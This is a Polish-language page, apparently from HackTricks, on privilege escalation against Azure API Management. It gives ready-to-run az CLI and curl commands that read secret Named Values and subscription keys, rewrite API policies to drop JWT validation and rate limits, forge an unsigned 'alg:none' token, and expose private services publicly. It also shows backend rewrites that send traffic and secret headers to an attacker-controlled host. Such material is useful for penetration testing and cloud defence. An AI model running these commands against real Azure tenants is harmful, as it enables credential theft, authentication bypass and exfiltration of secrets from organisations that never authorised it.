# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

Atak polega na uzyskaniu dostępu do wrażliwych sekretów przechowywanych w Azure API Management Named Values — albo przez bezpośrednie pobranie wartości sekretów, albo przez nadużycie uprawnień w celu uzyskania sekretów wspartych przez Key Vault za pomocą managed identities.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Dla każdej subskrypcji atakujący może uzyskać klucze subskrypcji, używając endpointu listSecrets metodą POST:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
Odpowiedź zawiera główny klucz subskrypcji (primaryKey) oraz pomocniczy klucz (secondaryKey). Przy użyciu tych kluczy atakujący może się uwierzytelnić i uzyskać dostęp do API opublikowanych przez API Management Gateway:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
Atakujący może uzyskać dostęp do wszystkich API i produktów powiązanych z subskrypcją. Jeśli subskrypcja ma dostęp do wrażliwych produktów lub API, atakujący może uzyskać poufne informacje lub wykonać nieautoryzowane operacje.

## `Microsoft.ApiManagement/service/policies/write` lub `Microsoft.ApiManagement/service/apis/policies/write`

Atakujący najpierw pobiera bieżącą politykę API:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
Atakujący może zmodyfikować politykę na różne sposoby, w zależności od swoich celów. Na przykład, aby wyłączyć uwierzytelnianie, jeśli polityka zawiera walidację tokenu JWT, atakujący może usunąć lub zakomentować tę sekcję:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
Aby usunąć rate limiting controls i umożliwić denial-of-service attacks, atakujący może usunąć lub zakomentować quota and rate-limit policies:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Aby zmodyfikować trasę backendu i przekierować ruch na serwer kontrolowany przez atakującego:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
Atakujący następnie stosuje zmodyfikowaną politykę. Treść żądania musi być obiektem JSON zawierającym politykę w formacie XML:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## Nieprawidłowa konfiguracja walidacji JWT

Atakujący musi wiedzieć, że API używa walidacji tokenów JWT i że polityka jest źle skonfigurowana. Źle skonfigurowane polityki walidacji JWT mogą mieć `require-signed-tokens="false"` lub `require-expiration-time="false"`, co pozwala serwisowi akceptować niepodpisane tokeny lub tokeny, które nigdy nie wygasają.

Atakujący tworzy złośliwy token JWT używając algorytmu none (niepodpisany):
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
Atakujący wysyła żądanie do API, używając złośliwego tokena:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Jeśli polityka jest błędnie skonfigurowana z `require-signed-tokens="false"`, usługa zaakceptuje niepodpisany token. Atakujący może również utworzyć token bez roszczenia daty wygaśnięcia, jeśli `require-expiration-time="false"`.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
Atakujący najpierw sprawdza aktualną konfigurację sieciową usługi:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
Atakujący przegląda odpowiedź JSON, aby zweryfikować wartości `publicNetworkAccess` i `virtualNetworkType`. Jeśli `publicNetworkAccess` jest ustawione na false lub `virtualNetworkType` jest ustawione na Internal, usługa jest skonfigurowana do dostępu prywatnego.

Aby udostępnić usługę w Internecie, atakujący musi zmienić obie te opcje. Jeśli usługa działa w trybie wewnętrznym (`virtualNetworkType: "Internal"`), atakujący zmienia ją na None lub External i włącza publiczny dostęp sieciowy. Można to zrobić za pomocą Azure Management API:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
Gdy `virtualNetworkType` jest ustawiony na `None` lub `External` i `publicNetworkAccess` jest włączony, usługa i wszystkie jej APIs stają się dostępne z Internetu, nawet jeśli wcześniej były chronione za siecią prywatną lub prywatnymi punktami końcowymi.

## `Microsoft.ApiManagement/service/backends/write`
Atakujący najpierw enumeruje istniejące backends, aby zidentyfikować, który należy zmodyfikować:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
Atakujący pobiera bieżącą konfigurację backendu, który chce zmodyfikować:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
Atakujący modyfikuje backend URL, aby wskazywał na serwer pod jego kontrolą. Najpierw pobiera ETag z poprzedniej odpowiedzi, a następnie aktualizuje backend:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Alternatywnie atakujący może skonfigurować nagłówki backendu, aby eksfiltrować Named Values zawierające sekrety. Odbywa się to poprzez konfigurację poświadczeń backendu:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Dzięki tej konfiguracji Named Values są wysyłane jako headers we wszystkich żądaniach do attacker-controlled backend, co umożliwia exfiltration of sensitive secrets.

{{#include ../../../banners/hacktricks-training.md}}
